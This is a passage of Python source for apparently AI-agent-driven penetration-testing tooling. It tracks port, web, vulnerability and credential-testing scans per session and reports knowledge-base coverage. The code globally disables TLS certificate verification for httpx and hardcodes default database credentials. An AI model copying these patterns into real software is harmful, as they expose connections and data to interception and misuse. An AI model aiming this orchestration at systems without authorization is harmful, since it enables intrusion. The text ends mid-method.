"""
Scan Tools for Autogen Agents
Provides function interfaces to all scanning services
"""

import os
from urllib.parse import urlparse
import httpx as _httpx
import json


# Wrap httpx module-level get/post/put/delete to always skip SSL verification
class _NoVerifyHTTPX:
    """Proxy that delegates to httpx but injects verify=False on shortcut calls."""
    def __getattr__(self, name):
        return getattr(_httpx, name)

    def get(self, *args, **kwargs):
        kwargs.setdefault("verify", False)
        return _httpx.get(*args, **kwargs)

    def post(self, *args, **kwargs):
        kwargs.setdefault("verify", False)
        return _httpx.post(*args, **kwargs)

    def put(self, *args, **kwargs):
        kwargs.setdefault("verify", False)
        return _httpx.put(*args, **kwargs)

    def delete(self, *args, **kwargs):
        kwargs.setdefault("verify", False)
        return _httpx.delete(*args, **kwargs)


httpx = _NoVerifyHTTPX()  # type: ignore[assignment]
from typing import Dict, List, Optional, Any
import time
import logging
import traceback
import threading
from datetime import datetime
import uuid

from port_profiles import (
    PortProfileError,
    count_ports as count_profile_ports,
    resolve as resolve_port_profile,
)
from web_profiles import WebProfileError, resolve as resolve_web_profile

# Configure logging
DEBUG_MODE = os.environ.get("SCAN_DEBUG", "false").lower() == "true"
MCP_MODE = os.environ.get("MCP_MODE", "false").lower() == "true"

# Default quick scan scope.
#
# This used to be the sequential range 1-1000 plus high web ports, which sounds
# like "the common ports" but is not: it is the first 1000 port NUMBERS. The
# services that matter most on a typical target sit above it — mysql 3306,
# postgresql 5432, vnc 5900, irc 6667, tomcat 8180, java-rmi 1099 — so a scan
# could report "12 open ports" while missing every high-value service, and any
# operator rule keyed to those services could never fire.
#
# nmap's top-1000 is the 1000 most commonly OPEN ports, frequency-ranked from
# nmap-services. It costs the same number of probes and finds all of the above.
# For scale: even top-100 — a tenth of the probes — covers mysql, postgresql,
# vnc, nfs and X11, none of which sequential 1-1000 reaches.
#
# Falls back to the old range only if the profile cannot be loaded, so a missing
# or malformed knowledge/port_profiles.yaml degrades to previous behaviour rather
# than leaving scans with no scope at all.
_WEB_PORTS_STR = os.environ.get("WEB_PORTS", "80,443,8080,8443,8000,8888,3000,5000")
_HIGH_WEB_PORTS = ",".join(
    p.strip() for p in _WEB_PORTS_STR.split(",")
    if p.strip().isdigit() and int(p.strip()) > 1000
)
_LEGACY_QUICK_PORTS = f"1-1000,{_HIGH_WEB_PORTS}" if _HIGH_WEB_PORTS else "1-1000"
DEFAULT_QUICK_PORTS_PROFILE = os.environ.get("DEFAULT_QUICK_PORTS_PROFILE", "top-1000")
try:
    _profile_ports = resolve_port_profile(DEFAULT_QUICK_PORTS_PROFILE, None)
    # Union with the configured web ports: the profile is frequency-ranked, and a
    # site's own non-standard web port may not be in it.
    DEFAULT_QUICK_PORTS = (
        f"{_profile_ports},{_HIGH_WEB_PORTS}" if _HIGH_WEB_PORTS else _profile_ports
    )
except Exception as _pp_err:      # PortProfileError, missing file, bad YAML
    logging.getLogger(__name__).warning(
        "Port profile %r unavailable (%s) — falling back to the sequential range %r, "
        "which misses mysql/postgresql/vnc/irc/tomcat",
        DEFAULT_QUICK_PORTS_PROFILE, _pp_err, _LEGACY_QUICK_PORTS,
    )
    DEFAULT_QUICK_PORTS = _LEGACY_QUICK_PORTS
# Deep follow-up sweep — masscan over the FULL range, not "everything above 1000".
#
# 1001-65535 was the correct complement back when the quick pass was the
# sequential range 1-1000: the two together tiled 1-65535 exactly once. That is
# no longer true. The quick pass is now nmap's frequency-ranked top-1000, whose
# members are scattered across the whole range (3306, 5432, 5900, 8180, 49152…),
# so 1001-65535 both re-probes ports the quick pass already covered AND leaves a
# hole: the ~600 low ports below 1001 that are not in the top-1000 list would
# never be scanned by either pass.
#
# masscan over 1-65535 closes the hole. It is a SYN sweep at `rate` pps, so the
# cost is a function of the rate, not of which subrange is asked for, and the
# overlap with the quick pass is deduplicated downstream at ingest.
DEFAULT_DEEP_SCAN_PORTS = os.environ.get("DEEP_SCAN_PORTS", "1-65535")

# Sequential low ranges an LLM reaches for when it means "the common ports".
# They are not the common ports — they are the first N port NUMBERS, which is
# why the quick default moved to the frequency-ranked profile. Callers that pass
# one of these are upgraded rather than obeyed; see _upgrade_sequential_quick_ports.
_SEQUENTIAL_LOW_RANGES = {"1-1000", "0-1000", "1-1024", "0-1024"}


def _upgrade_sequential_quick_ports(ports: str) -> str:
    """Map a sequential low range onto the frequency-ranked quick default.

    `start_full_scan(quick_ports=...)` is LLM-callable, and the model reaches for
    "1-1000" because that phrasing is everywhere in scanning lore. Defaulting the
    parameter is not enough — an explicitly-passed 1-1000 sails straight past a
    `if not quick_ports` check and silently reinstates the exact scope the
    top-1000 profile exists to replace, missing mysql/postgresql/vnc/tomcat.

    Only exact sequential low ranges are upgraded (optionally carrying the
    configured high web-port suffix, which is how the legacy default was built).
    Anything else — a real operator selection, a single port, a custom list — is
    left untouched.
    """
    if not ports:
        return ports
    candidate = ports.strip()
    if candidate in _SEQUENTIAL_LOW_RANGES or candidate == _LEGACY_QUICK_PORTS:
        logger.info(
            "Upgrading quick_ports=%r to the top-1000 profile: a sequential low "
            "range is the first 1000 port NUMBERS, not the 1000 most commonly "
            "open ports, and misses mysql/postgresql/vnc/tomcat",
            candidate,
        )
        return DEFAULT_QUICK_PORTS
    return candidate


def _is_known_port_scope(ports: str) -> bool:
    """True if `ports` exactly matches a resolved port profile.

    Used to widen the anti-hallucination guard in start_full_scan: a range the
    operator actually selected is legitimate, an LLM-invented one is not.
    """
    if not ports:
        return False
    try:
        from port_profiles import load_profiles
        return any(p["ports"] == ports for p in load_profiles()["profiles"].values())
    except Exception:
        return False
LOG_LEVEL = logging.DEBUG if DEBUG_MODE else logging.INFO

# Only configure basicConfig if NOT in MCP mode (MCP uses stdio and stderr logging breaks it)
if not MCP_MODE:
    logging.basicConfig(
        level=LOG_LEVEL,
        format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

# Use explicit logger name to ensure log capture works regardless of import path
logger = logging.getLogger("scan_tools")

# In MCP mode, disable all logging to avoid contaminating stdio
if MCP_MODE:
    logger.addHandler(logging.NullHandler())
    logger.setLevel(logging.CRITICAL + 1)  # Effectively disable


# ============================================================================
# Session Scan Tracker - Tracks all scans associated with a pentest session
# ============================================================================

class SessionScanTracker:
    """
    Thread-safe tracker for scan jobs associated with pentest sessions.
    Uses thread-local storage to track the current session context.
    """

    # Thread-local storage for current session context
    _local = threading.local()

    # Global registry of all session scans (thread-safe via lock)
    _registry: Dict[str, Dict[str, Any]] = {}
    _lock = threading.Lock()

    # Scan type to phase mapping
    SCAN_PHASES = {
        "masscan": "PHASE 1 - PORT DISCOVERY",
        "nmap": "PHASE 2 - SERVICE DETECTION",
        "web_scan": "PHASE 3 - WEB SCANNING",
        "nuclei": "PHASE 4 - VULNERABILITY SCAN",
        "playwright": "PHASE 3 - WEB SCANNING",
        "udp": "PHASE 5 - UDP DISCOVERY",
        "subfinder": "PHASE 0 - RECON",
        "dnsx": "PHASE 0 - RECON",
        "asnmap": "PHASE 0 - RECON",
        "uncover": "PHASE 0 - RECON",
        "cloudlist": "PHASE 0 - RECON",
        "httpx": "PHASE 1.5 - HTTP PROBING",
        "naabu": "PHASE 1 - PORT DISCOVERY",
        "katana": "PHASE 3 - WEB CRAWLING",
        "brutus": "PHASE 6 - CREDENTIAL TESTING",
    }

    @classmethod
    def set_session(cls, session_id: str, port_profile: str = None,
                    web_profile: str = None):
        """Set the current session context for this thread.

        `port_profile` names an entry in knowledge/port_profiles.yaml and fixes
        the port scope for every discovery scan this session runs.  It is
        resolved once here (rather than per tool call) so a bad id fails loudly
        at session start instead of silently mid-run, and so the LLM never has
        to pass port ranges — which is where it hallucinates most.
        """
        cls._local.session_id = session_id
        cls._local.started_at = datetime.utcnow().isoformat() + "Z"

        cls._local.port_profile = port_profile or None
        cls._local.port_scope = None
        if port_profile:
            try:
                cls._local.port_scope = resolve_port_profile(port_profile)
                logger.info(
                    f"[SessionScanTracker] Port scope for {session_id}: "
                    f"{port_profile} ({count_profile_ports(cls._local.port_scope)} ports)"
                )
            except PortProfileError as e:
                # Fall back to the agent's built-in quick/deep policy rather than
                # aborting the session; the warning names the bad id.
                logger.warning(f"[SessionScanTracker] Ignoring bad port_profile {port_profile!r}: {e}")
                cls._local.port_profile = None

        # Web scan depth, resolved once for the same reasons as the port scope.
        cls._local.web_profile = web_profile or None
        cls._local.web_scope = None
        if web_profile:
            try:
                cls._local.web_scope = resolve_web_profile(web_profile)
                if cls._local.web_scope:
                    logger.info(
                        f"[SessionScanTracker] Web scope for {session_id}: {web_profile} "
                        f"(stages: {','.join(cls._local.web_scope['stages'])})"
                    )
            except WebProfileError as e:
                logger.warning(f"[SessionScanTracker] Ignoring bad web_profile {web_profile!r}: {e}")
                cls._local.web_profile = None

        # Initialize session in registry if needed
        with cls._lock:
            if session_id not in cls._registry:
                cls._registry[session_id] = {
                    "session_id": session_id,
                    "started_at": cls._local.started_at,
                    "scans": [],
                    "current_phase": "INITIALIZING",
                }
        logger.info(f"[SessionScanTracker] Session context set: {session_id}")

    @classmethod
    def clear_session(cls):
        """Clear the current session context."""
        session_id = getattr(cls._local, 'session_id', None)
        if session_id:
            logger.info(f"[SessionScanTracker] Session context cleared: {session_id}")
        cls._local.session_id = None
        cls._local.started_at = None
        cls._local.port_profile = None
        cls._local.port_scope = None
        cls._local.web_profile = None
        cls._local.web_scope = None

    @classmethod
    def get_current_session(cls) -> Optional[str]:
        """Get the current session ID for this thread."""
        return getattr(cls._local, 'session_id', None)

    @classmethod
    def get_port_scope(cls) -> Optional[str]:
        """Resolved port string for this session, or None to use agent defaults."""
        return getattr(cls._local, 'port_scope', None)

    @classmethod
    def get_port_profile(cls) -> Optional[str]:
        """Port profile id in effect for this session, if any."""
        return getattr(cls._local, 'port_profile', None)

    @classmethod
    def get_web_scope(cls) -> Optional[dict]:
        """Resolved web profile settings for this session, or None."""
        return getattr(cls._local, 'web_scope', None)

    @classmethod
    def get_web_profile(cls) -> Optional[str]:
        """Web profile id in effect for this session, if any."""
        return getattr(cls._local, 'web_profile', None)

    @classmethod
    def send_heartbeat(cls):
        """
        Send a heartbeat for the current session.
        Used by blocking tools (wait_for_job_completion) to tell the watchdog
        that the session is still active even though no new messages are being generated.
        """
        session_id = cls.get_current_session()
        if not session_id:
            return
        # Store heartbeat timestamp in the registry
        with cls._lock:
            if session_id in cls._registry:
                cls._registry[session_id]["last_heartbeat"] = datetime.utcnow().isoformat() + "Z"

    @classmethod
    def get_last_heartbeat(cls, session_id: str) -> Optional[str]:
        """Get the last heartbeat timestamp for a session."""
        with cls._lock:
            session = cls._registry.get(session_id)
            if session:
                return session.get("last_heartbeat")
        return None

    @classmethod
    def track_scan(cls, scan_type: str, job_id: str, params: Dict[str, Any] = None):
        """
        Track a new scan job for the current session.

        Args:
            scan_type: Type of scan (masscan, nmap, nuclei, web_scan, playwright, udp)
            job_id: The job/scan ID returned by the scanner service
            params: Optional parameters used for the scan
        """
        session_id = cls.get_current_session()
        if not session_id:
            logger.debug(f"[SessionScanTracker] No session context, not tracking {scan_type} job {job_id}")
            return

        scan_entry = {
            "type": scan_type,
            "job_id": job_id,
            "started_at": datetime.utcnow().isoformat() + "Z",
            "status": "running",
            "params": params or {},
            "result_summary": None,
            "completed_at": None,
            "duration_seconds": None,
        }

        with cls._lock:
            if session_id in cls._registry:
                cls._registry[session_id]["scans"].append(scan_entry)
                cls._registry[session_id]["current_phase"] = cls.SCAN_PHASES.get(
                    scan_type, "SCANNING"
                )

        logger.info(f"[SessionScanTracker] Tracked {scan_type} job {job_id} for session {session_id}")

    @classmethod
    def update_scan_status(cls, job_id: str, status: str, result_summary: Dict = None):
        """
        Update the status of a tracked scan.

        Args:
            job_id: The job/scan ID
            status: New status (running, completed, failed)
            result_summary: Optional summary of results
        """
        session_id = cls.get_current_session()
        if not session_id:
            return

        with cls._lock:
            if session_id in cls._registry:
                for scan in cls._registry[session_id]["scans"]:
                    if scan["job_id"] == job_id:
                        scan["status"] = status
                        if status in ("completed", "failed"):
                            scan["completed_at"] = datetime.utcnow().isoformat() + "Z"
                            # Calculate duration
                            try:
                                started = datetime.fromisoformat(scan["started_at"].rstrip("Z"))
                                completed = datetime.fromisoformat(scan["completed_at"].rstrip("Z"))
                                scan["duration_seconds"] = (completed - started).total_seconds()
                            except Exception:
                                pass
                        if result_summary:
                            scan["result_summary"] = result_summary

                        # Persist to database when scan completes
                        if status in ("completed", "failed"):
                            logger.info(f"[SessionScanTracker] Scan {job_id} {status}, persisting session data")
                            # Release lock before calling persist (it may acquire locks)
                            from threading import Thread
                            Thread(target=cls.persist_to_db, args=(session_id,), daemon=True).start()

                        break

    @classmethod
    def get_session_status(cls, session_id: str = None) -> Dict[str, Any]:
        """
        Get the full scan status for a session.

        Args:
            session_id: Session ID (uses current session if not provided)

        Returns:
            Dictionary with session info and all tracked scans
        """
        if session_id is None:
            session_id = cls.get_current_session()

        if not session_id:
            return {"error": "No session context available"}

        with cls._lock:
            session_data = cls._registry.get(session_id)
            if not session_data:
                # Try to restore from database before giving up
                logger.info(f"[SessionScanTracker] Session {session_id} not in memory, attempting database restore")

        # Release lock before calling restore (it acquires its own lock)
        if not session_data:
            cls.restore_from_db(session_id)

            # Check again after restore
            with cls._lock:
                session_data = cls._registry.get(session_id)
                if not session_data:
                    return {
                        "session_id": session_id,
                        "error": "Session not found in tracker or database",
                        "scans": []
                    }

        # Reacquire lock for the rest of the method
        with cls._lock:
            session_data = cls._registry.get(session_id)

            # Deep copy to avoid race conditions
            return {
                "session_id": session_data["session_id"],
                "started_at": session_data["started_at"],
                "current_phase": session_data["current_phase"],
                "scans": list(session_data["scans"]),
                "summary": cls._generate_summary(session_data)
            }

    @classmethod
    def _generate_summary(cls, session_data: Dict) -> Dict[str, Any]:
        """Generate a summary of scan progress."""
        scans = session_data.get("scans", [])

        total = len(scans)
        completed = sum(1 for s in scans if s["status"] == "completed")
        running = sum(1 for s in scans if s["status"] == "running")
        failed = sum(1 for s in scans if s["status"] == "failed")

        # Count by type
        by_type = {}
        for scan in scans:
            scan_type = scan["type"]
            if scan_type not in by_type:
                by_type[scan_type] = {"total": 0, "completed": 0, "running": 0}
            by_type[scan_type]["total"] += 1
            if scan["status"] == "completed":
                by_type[scan_type]["completed"] += 1
            elif scan["status"] == "running":
                by_type[scan_type]["running"] += 1

        return {
            "total_scans": total,
            "completed": completed,
            "running": running,
            "failed": failed,
            "by_type": by_type,
        }

    # Result keys worth surfacing per tool. A scan that "completed" having found
    # nothing is a materially different outcome from one that found 40 things, and
    # the existing summary counted both as simply "completed".
    _RESULT_KEYS = (
        "total_valid_credentials", "vulnerabilities_found", "findings_count",
        "paths_found", "urls_scanned", "urls_discovered", "pages_crawled",
        "ports_found", "open_ports", "screenshots", "alerts", "inserted",
        "total", "count",
    )

    @classmethod
    def _result_highlights(cls, result: Any) -> Dict[str, Any]:
        """Pull countable outcomes out of a tool's result blob, flattened one level."""
        out: Dict[str, Any] = {}
        if not isinstance(result, dict):
            return out
        for k in cls._RESULT_KEYS:
            if isinstance(result.get(k), (int, float)):
                out[k] = result[k]
        for section in ("stages", "ingest", "stats", "result"):
            sub = result.get(section)
            if isinstance(sub, dict):
                for k in cls._RESULT_KEYS:
                    if isinstance(sub.get(k), (int, float)) and k not in out:
                        out[k] = sub[k]

        # Several tools report findings as LISTS, not counts — full-scan's
        # ports_discovered is {"quick": [...], "full": [...]}, and all_open_ports
        # is a bare list. Without this a full scan that found 25 ports reported
        # "produced nothing", which is the exact false negative this summary
        # exists to prevent.
        for key in ("all_open_ports", "ports_found", "open_ports", "urls", "findings"):
            v = result.get(key)
            if isinstance(v, list) and v and key not in out:
                out[key] = len(v)
        pd = result.get("ports_discovered")
        if isinstance(pd, dict):
            for sub_key, v in pd.items():
                if isinstance(v, list) and v:
                    out[f"ports_{sub_key}"] = len(v)
                elif isinstance(v, (int, float)) and v:
                    out[f"ports_{sub_key}"] = v
        return out

    @classmethod
    def _kb_coverage(cls, targets: List[str], types_run: List[str]) -> Dict[str, Any]:
        """Did the run act on what the knowledge base recommended?

        The flow summary was otherwise pure telemetry — counts of what happened,
        with no reference to anything the system had learned. That answers "what
        ran" but not "did it run what the KB said to run", which for a RAG-driven
        scanner is the question worth asking.

        scan_recommendations is populated per discovered (ip, service) by the
        post-ingest recommender: `source='rules'` rows come from the KB, other
        sources (e.g. 'ollama') come from the model. Cross-referencing them
        against the scan types that actually ran turns the summary into a coverage
        report — and surfaces recommendations that were generated and then ignored,
        which is invisible everywhere else.

        Degrades to {"available": False} on any DB problem: this is reporting, and
        must never be the reason a session teardown fails.
        """
        db_dsn = os.environ.get(
            "DB_DSN", "dbname=scans user=app password=app host=rag-postgres port=5432")
        try:
            import psycopg2
            from psycopg2.extras import RealDictCursor
            with psycopg2.connect(db_dsn) as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    if targets:
                        cur.execute(
                            "SELECT scanner, service, source, status, priority, "
                            "       target_kind "
                            "FROM scan_recommendations "
                            "WHERE host(ip)::text = ANY(%s)", (list(targets),))
                    else:
                        cur.execute(
                            "SELECT scanner, service, source, status, priority, "
                            "       target_kind "
                            "FROM scan_recommendations")
                    rows = [dict(r) for r in cur.fetchall()]
        except Exception as e:
            logger.warning("KB coverage lookup failed: %s", e)
            return {"available": False, "reason": str(e)[:200]}

        # 'resource' recommendations are inputs (wordlists, template sets), not
        # scans. Counting them would make coverage unreachable by construction:
        # they can never be "acted on", so every run would report them as
        # recommended-but-never-done forever. Reported separately as
        # prerequisites instead.
        prerequisites = sorted({(r.get("scanner") or "?") for r in rows
                                if (r.get("target_kind") or "service") == "resource"})
        non_dispatchable = sorted({(r.get("scanner") or "?") for r in rows
                                   if (r.get("target_kind") or "service") in ("artifact", "range")})
        rows = [r for r in rows if (r.get("target_kind") or "service") == "service"]

        if not rows:
            return {"available": True, "recommendations": 0,
                    "prerequisites": prerequisites,
                    "not_yet_dispatchable": non_dispatchable,
                    "note": "no dispatchable KB recommendations for these targets"}

        ran = {str(t).lower() for t in types_run}

        # Which SCAN TYPES satisfy a recommended SCANNER. Substring matching is not
        # good enough: "nmap" does not appear in "full_scan", so a full scan — which
        # IS an nmap scan — was reported as "nmap recommended x48, never run".
        # A coverage report that wrongly accuses is worse than none, so the mapping
        # is explicit. Recommenders naming a tool the stack has no scan type for
        # (metasploit, enum4linux) correctly stay uncovered — that is a real gap,
        # not a matching artefact.
        SATISFIED_BY = {
            "nmap": {"nmap", "full_scan", "masscan-then-nmap", "nmap-tcp",
                     "deep_port_scan", "nmap-udp", "udp_scan"},
            "masscan": {"masscan", "full_scan", "masscan-then-nmap", "deep_port_scan"},
            "naabu": {"naabu", "full_scan"},
            "nuclei": {"nuclei", "pipeline", "web"},
            "gobuster": {"gobuster", "pipeline", "web"},
            "nikto": {"nikto", "pipeline", "web"},
            "katana": {"katana", "pipeline", "web"},
            "zap": {"zap", "pipeline", "web"},
            "playwright": {"playwright", "pipeline", "web"},
            "hydra": {"credential-check", "credential_check", "brutus"},
            "smbmap": {"smb-vuln-scan", "smb_vuln_scan"},
            "enum4linux": {"smb-vuln-scan", "smb_vuln_scan"},
            "crackmapexec": {"credential-check", "smb-vuln-scan"},
        }

        def _acted(scanner: str) -> bool:
            sc = (scanner or "").lower()
            if sc in ran:
                return True
            return bool(SATISFIED_BY.get(sc, set()) & ran)

        by_source, by_scanner = {}, {}
        acted = 0
        for r in rows:
            src = r.get("source") or "unknown"
            by_source[src] = by_source.get(src, 0) + 1
            sc = r.get("scanner") or "unknown"
            e = by_scanner.setdefault(sc, {"recommended": 0, "acted_on": False,
                                           "top_priority": None})
            e["recommended"] += 1
            pr = r.get("priority")
            if isinstance(pr, int) and (e["top_priority"] is None or pr > e["top_priority"]):
                e["top_priority"] = pr
            if _acted(sc):
                e["acted_on"] = True
                acted += 1

        ignored = sorted(
            ({"scanner": k, **v} for k, v in by_scanner.items() if not v["acted_on"]),
            key=lambda x: (-(x["top_priority"] or 0), -x["recommended"]),
        )
        return {
            "available": True,
            "recommendations": len(rows),
            "by_source": by_source,           # 'rules' = KB, others = model
            "acted_on": acted,
            "ignored": len(rows) - acted,
            "coverage_pct": round(100.0 * acted / len(rows), 1),
            "recommended_but_never_run": ignored[:15],
            "pending_status_count": sum(1 for r in rows if (r.get("status") or "") == "pending"),
            # Kept out of the coverage maths on purpose — see above.
            "prerequisites": prerequisites,
            "not_yet_dispatchable": non_dispatchable,
        }

    @classmethod
    def load_scans_from_db(cls, session_id: str) -> List[Dict[str, Any]]:
        """Rebuild the scan list from session_scan_metrics.

        The in-memory registry is discarded by cleanup_session(), so anything
        that needs the flow AFTER a session ends — notably the post-teardown
        refresh, which exists because scans are often still running when the
        session finishes — has to read it back from the database.

        Returns the same shape build_flow_summary() expects from the registry.
        Ordered by started_at so flow_order stays the real execution order.
        """
        db_dsn = os.environ.get(
            "DB_DSN",
            "dbname=scans user=app password=app host=rag-postgres port=5432")
        rows: List[Dict[str, Any]] = []
        try:
            import psycopg2
            from psycopg2.extras import RealDictCursor
            with psycopg2.connect(db_dsn) as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute(
                        """SELECT scan_type, job_id, status, started_at,
                                  completed_at, duration_seconds, params,
                                  result_summary
                             FROM session_scan_metrics
                            WHERE session_id = %s::uuid
                            ORDER BY started_at NULLS LAST, id""",
                        (str(session_id),),
                    )
                    for r in cur.fetchall():
                        rows.append({
                            "type": r["scan_type"],
                            "job_id": r["job_id"],
                            "status": r["status"],
                            "started_at": (r["started_at"].isoformat()
                                           if r["started_at"] else None),
                            "completed_at": (r["completed_at"].isoformat()
                                             if r["completed_at"] else None),
                            "duration_seconds": (float(r["duration_seconds"])
                                                 if r["duration_seconds"] is not None
                                                 else None),
                            "params": r["params"] or {},
                            "result_summary": r["result_summary"] or None,
                        })
        except Exception as e:
            logger.warning("[SessionScanTracker] load_scans_from_db failed for %s: %s",
                           session_id, e)
        return rows

    @classmethod
    def build_flow_summary(cls, session_id: str = None,
                           scans: Optional[List[Dict[str, Any]]] = None) -> Dict[str, Any]:
        """End-of-session report: what each SCAN TYPE actually did, in order.

        _generate_summary only ever answered "how many finished". That cannot tell
        an operator whether the engagement did its job: a session where nuclei ran
        and found nothing looks identical to one where nuclei never produced a
        usable result, and a failed stage is invisible once the count says
        "completed". This reconstructs the flow per type — sequence, targets,
        durations, what each produced, and why anything failed.
        """
        session_id = session_id or cls.get_current_session()
        if scans is None:
            # Default source is the live registry. Callers running AFTER
            # cleanup_session() must pass scans explicitly (see
            # load_scans_from_db) — the registry is empty by then and this would
            # silently report a session with no scans at all.
            data = cls.get_session_status(session_id) or {}
            scans = data.get("scans", []) or []
        else:
            # `data` is still needed below for the `totals` block. Synthesise it
            # from the supplied scans so the DB-sourced path produces the same
            # shape as the registry path.
            data = {"session_id": session_id, "scans": scans}

        by_type: Dict[str, Any] = {}
        for idx, scan in enumerate(scans, start=1):
            st = scan.get("type") or "unknown"
            entry = by_type.setdefault(st, {
                "scan_type": st, "runs": 0, "completed": 0, "failed": 0,
                "running": 0, "targets": [], "total_duration_seconds": 0.0,
                "results": {}, "failures": [], "sequence": [],
            })
            entry["runs"] += 1
            status = (scan.get("status") or "unknown").lower()
            if status in ("completed", "failed", "running"):
                entry[status] += 1

            params = scan.get("params") or {}
            for key in ("targets", "target", "target_url", "ip_address", "targets_list"):
                v = params.get(key)
                if not v:
                    continue
                for t in (v if isinstance(v, (list, tuple)) else [v]):
                    t = str(t)
                    if t not in entry["targets"]:
                        entry["targets"].append(t)

            dur = scan.get("duration_seconds")
            if isinstance(dur, (int, float)):
                entry["total_duration_seconds"] += float(dur)

            highlights = cls._result_highlights(scan.get("result_summary"))
            for k, v in highlights.items():
                entry["results"][k] = entry["results"].get(k, 0) + v

            if status == "failed":
                res = scan.get("result_summary")
                why = (res.get("error") if isinstance(res, dict) else None) or "no error recorded"
                entry["failures"].append({"job_id": scan.get("job_id"), "error": str(why)[:300]})

            entry["sequence"].append({
                "step": idx,
                "job_id": scan.get("job_id"),
                "status": status,
                "started_at": scan.get("started_at"),
                "duration_seconds": dur,
                "produced": highlights or None,
            })

        for e in by_type.values():
            e["total_duration_seconds"] = round(e["total_duration_seconds"], 1)
            # "completed but produced nothing" is the case worth surfacing: it reads
            # as success everywhere else and is usually where a broken tool hides.
            e["produced_nothing"] = (
                e["completed"] > 0 and not any(v for v in e["results"].values())
            )

        ordered = [s.get("type") for s in scans]
        seen, flow = set(), []
        for t in ordered:
            if t and t not in seen:
                seen.add(t)
                flow.append(t)

        all_targets = sorted({t for e in by_type.values() for t in e["targets"]})
        # Strip URLs down to hosts so they match scan_recommendations.ip.
        hosts = sorted({
            (urlparse(t if "://" in t else "//" + t).hostname or t)
            for t in all_targets
        })

        return {
            "session_id": session_id,
            "generated_at": datetime.utcnow().isoformat() + "Z",
            "kb_coverage": cls._kb_coverage(hosts, flow),
            "scan_types_run": len(by_type),
            "total_scans": len(scans),
            "flow_order": flow,
            "totals": cls._generate_summary(data),
            "by_scan_type": [by_type[k] for k in sorted(by_type)],
            "types_that_produced_nothing": sorted(
                k for k, v in by_type.items() if v["produced_nothing"]
            ),
            "types_with_failures": sorted(
                k for k, v in by_type.items() if v["failures"]
            ),
        }

    @classmethod
    def get_running_scans(cls, session_id: str = None) -> List[Dict[str, Any]]:
        """Get all running scans for the current (or specified) session."""
        if session_id is None:
            session_id = cls.get_current_session()
        if not session_id:
            return []
        with cls._lock:
            session_data = cls._registry.get(session_id)
            if not session_data:
                return []
            return [s for s in session_data["scans"] if s["status"] == "running"]

    @classmethod
    def restore_from_db(cls, session_id: str):
        """
        Restore session scan data from session_scan_metrics table into memory.
        Call this when accessing a session that's not in the tracker.
        """
        db_dsn = os.environ.get("DB_DSN", "dbname=scans user=app password=app host=rag-postgres port=5432")
        try:
            import psycopg2
            from psycopg2.extras import RealDictCursor
            conn = psycopg2.connect(db_dsn)
            cur = conn.cursor(cursor_factory=RealDictCursor)

            cur.execute("""
                SELECT scan_type, scan_phase, job_id, status, started_at, completed_at,
                       duration_seconds, params, result_summary, created_at
                FROM session_scan_metrics
                WHERE session_id = %s::uuid
                ORDER BY created_at ASC
            """, (session_id,))

            rows = cur.fetchall()
            conn.close()

            if not rows:
                logger.debug(f"[SessionScanTracker] No persisted scans found for session {session_id}")
                return

            # Initialize session in tracker if not exists
            with cls._lock:
                if session_id not in cls._registry:
                    cls._registry[session_id] = {
                        "session_id": session_id,
                        "scans": [],
                        "started_at": None
                    }

                # Restore scans from database
                for row in rows:
                    scan_data = {
                        "type": row["scan_type"],
                        "phase": row["scan_phase"],
                        "job_id": row["job_id"],
                        "status": row["status"],
                        "started_at": row["started_at"].isoformat() if row["started_at"] else None,
                        "completed_at": row["completed_at"].isoformat() if row["completed_at"] else None,
                        "duration_seconds": row["duration_seconds"],
                        "params": row["params"] or {},
                        "result_summary": row["result_summary"] or {}
                    }
                    cls._registry[session_id]["scans"].append(scan_data)

            logger.info(f"[SessionScanTracker] Restored {len(rows)} scans for session {session_id} from database")

        except Exception as e:
            logger.error(f"[SessionScanTracker] Failed to restore session {session_id} from database: {e}")

    @classmethod
    def persist_to_db(cls, session_id: str):
        """
        Persist in-memory scan entries to the session_scan_metrics table.
        Call before cleanup_session() so data survives restarts.
        """
        with cls._lock:
            session_data = cls._registry.get(session_id)
            if not session_data or not session_data.get("scans"):
                logger.debug(f"[SessionScanTracker] Nothing to persist for session {session_id}")
                return

            scans = list(session_data["scans"])

        db_dsn = os.environ.get("DB_DSN", "dbname=scans user=app password=app host=rag-postgres port=5432")
        try:
            import psycopg2
            from psycopg2.extras import Json as PgJson
            conn = psycopg2.connect(db_dsn)
            cur = conn.cursor()
            for scan in scans:
                cur.execute(
                    # UPSERT on (session_id, job_id).
                    #
                    # This was `ON CONFLICT DO NOTHING` with no matching unique
                    # constraint — the table's only key is PRIMARY KEY (id) — so
                    # nothing ever conflicted and every call INSERTED AGAIN. The
                    # live table held 104 rows for 75 distinct jobs, including one
                    # job with 6 copies carrying two different statuses.
                    #
                    # It also meant a scan persisted while still `running` could
                    # never be corrected to `completed`: the update was silently
                    # dropped, leaving rows permanently stuck mid-flight. That
                    # makes this table unusable as the source for rebuilding a
                    # flow summary after the in-memory registry is gone.
                    #
                    # Requires the unique index added in
                    # db_init/ensure_all_tables.sql.
                    """INSERT INTO session_scan_metrics
                       (session_id, scan_type, scan_phase, job_id, status,
                        started_at, completed_at, duration_seconds, params, result_summary)
                       VALUES (%s::uuid, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                       ON CONFLICT (session_id, job_id) DO UPDATE SET
                           status           = EXCLUDED.status,
                           completed_at     = COALESCE(EXCLUDED.completed_at,
                                                       session_scan_metrics.completed_at),
                           duration_seconds = COALESCE(EXCLUDED.duration_seconds,
                                                       session_scan_metrics.duration_seconds),
                           result_summary   = COALESCE(EXCLUDED.result_summary,
                                                       session_scan_metrics.result_summary),
                           scan_phase       = EXCLUDED.scan_phase""",
                    (
                        session_id,
                        scan.get("type"),
                        cls.SCAN_PHASES.get(scan.get("type"), "SCANNING"),
                        scan.get("job_id"),
                        scan.get("status", "unknown"),
                        scan.get("started_at"),
                        scan.get("completed_at"),
                        scan.get("duration_seconds"),
                        PgJson(scan.get("params") or {}),
                        PgJson(scan.get("result_summary") or {}),
                    ),
                )
            conn.commit()
            cur.close()
            conn.close()
            logger.info(f"[SessionScanTracker] Persisted {len(scans)} scan entries for session {session_id}")
        except Exception as e:
            logger.warning(f"[SessionScanTracker] Failed to persist scans for {session_id}: {e}")

    @classmethod
    def cleanup_session(cls, session_id: str):
        """Remove a session from the tracker (call when session ends)."""
        with cls._lock:
            if session_id in cls._registry:
